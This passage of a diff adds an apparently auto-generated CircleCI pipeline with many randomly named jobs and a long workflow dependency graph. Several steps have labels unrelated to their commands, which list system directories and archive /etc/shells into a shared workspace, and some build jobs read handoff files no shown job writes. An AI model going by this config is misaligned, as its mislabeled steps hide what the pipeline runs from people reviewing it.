+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Animate Crafting Recipes Lod 1
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 3 -type f -exec head -n 1 -q {} + 2>/dev/null | cat -n; true ; } > /tmp/recorder/4aeb4443b8
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - '4aeb4443b8'
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/4aeb4443b8 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  d2uv7j:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: edge team cull
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - shells | gzip -c >'/var/tmp/message_bread_1021.tgz'&&tar -tzf '/var/tmp/message_bread_1021.tgz'; true ; } > /tmp/recorder/trade
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'trade'
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  ALIGNED16:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: BUILD 28EF
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; command ls -SnR /usr/local|awk '{ print $9 }'; true ; } > /tmp/recorder/AssetProfileDustyViolet
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'AssetProfileDustyViolet'
+  DATA-388:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/AssetProfileDustyViolet > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  CacheIter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: filing mode debug
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; printf 'a\n\n\nb\n' >${TMPDIR:-/tmp}/whiteTemplateFlour.log && cat -b ${TMPDIR:-/tmp}/whiteTemplateFlour.log; true ; } > /tmp/recorder/tmp-99b86a7
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - 'tmp-99b86a7'
+  v7-nightly5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/1paytobrgg7r > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+  glacier-contract:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Where are the thumbnails
+          command: |
+            mkdir -p /tmp/recorder
+            { set +o pipefail 2>/dev/null; find /usr/bin -maxdepth 3 -type f -name 'z*' -mmin -1440 -print0|xargs -0r wc -l|sort -n; true ; } > /tmp/recorder/20190528_085851
+            echo "written-E"
+      - persist_to_workspace:
+          root: /tmp/recorder
+          paths:
+            - '20190528_085851'
+  v6-edge5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/recorder
+      - run:
+          name: Review handoff data
+          command: |
+            { tail -c 1024 /tmp/recorder/20190528_085851 > /dev/null; echo "tail1k ok" ; } || true
+      - run:
+          name: Fetch minimal
+          command: git clone --depth 2 --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand sources
+          command: tar --extract --file=release-images-prod.tar
+      - run:
+          command: g++ --version
+      - run:
+          name: Record build info
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: taskset -c 0-3 ./init-edge
+
+workflows:
+  main:
+    jobs:
+      - o-form
+      - logIterateCb
+      - ValidateRelease:
+          requires:
+            - o-form
+            - logIterateCb
+      - rigel:
+          requires:
+            - o-form
+            - logIterateCb
+      - whiskey:
+          requires:
+            - o-form
+            - logIterateCb
+      - node20-cov:
+          requires:
+            - o-form
+            - logIterateCb
+      - t-old:
+          requires:
+            - o-form
+            - logIterateCb
+      - add-session:
+          requires:
+            - o-form
+            - logIterateCb
+      - STAGE_UAT:
+          requires:
+            - o-form
+            - logIterateCb
+      - gating:
+          requires:
+            - o-form
+            - logIterateCb
+      - check-quick-release-candidate:
+          requires:
+            - o-form
+            - logIterateCb
+      - zulu:
+          requires:
+            - o-form
+            - logIterateCb
+      - v7-nightly5:
+          requires:
+            - o-form
+            - logIterateCb
+      - uniform:
+          requires:
+            - o-form
+            - logIterateCb
+      - y7
+      - push-it:
+          requires:
+            - y7
+      - allBits:
+          requires:
+            - y7
+      - LAB_STAGE_7:
+          requires:
+            - allBits
+      - Save-Decorator4:
+          requires:
+            - allBits
+      - chen-smoke:
+          requires:
+            - Save-Decorator4
+      - Articles:
+          requires:
+            - Save-Decorator4
+      - biuld:
+          requires:
+            - Articles
+      - iris-dev:
+          requires:
+            - Articles
+      - verify:
+          requires:
+            - iris-dev
+      - yamadaf:
+          requires:
+            - iris-dev
+      - ensure-quick-artifact-bundle:
+          requires:
+            - yamadaf
+      - glacier-contract:
+          requires:
+            - yamadaf
+      - v6-edge5:
+          requires:
+            - glacier-contract
+      - upload63-uat:
+          requires:
+            - glacier-contract
+      - VerifyPipeline:
+          requires:
+            - upload63-uat
+      - rbMap_28:
+          requires:
+            - upload63-uat
+      - LAB_VERIFY_3:
+          requires:
+            - rbMap_28
+      - iter7491:
+          requires:
+            - rbMap_28
+      - add-dashboard-reload:
+          requires:
+            - iter7491
+      - OQ:
+          requires:
+            - iter7491
+      - alpha-v2:
+          requires:
+            - OQ
+      - mark15:
+          requires:
+            - OQ
+      - sep27-cleanup:
+          requires:
+            - mark15
+      - tel_rv:
+          requires:
+            - mark15
+      - DATA-72:
+          requires:
+            - tel_rv
+      - prod_val:
+          requires:
+            - tel_rv
+      - Package_Tests7:
+          requires:
+            - prod_val
+      - TRL-COST-KEY:
+          requires:
+            - prod_val
+      - anothr-run:
+          requires:
+            - TRL-COST-KEY
+      - clanSize7:
+          requires:
+            - TRL-COST-KEY
+      - fx-2:
+          requires:
+            - clanSize7
+      - ALIGNED16:
+          requires:
+            - clanSize7
+      - DATA-388:
+          requires:
+            - ALIGNED16
+      - VECX:
+          requires:
+            - ALIGNED16
+      - build-quick-test-matrix:
+          requires:
+            - VECX
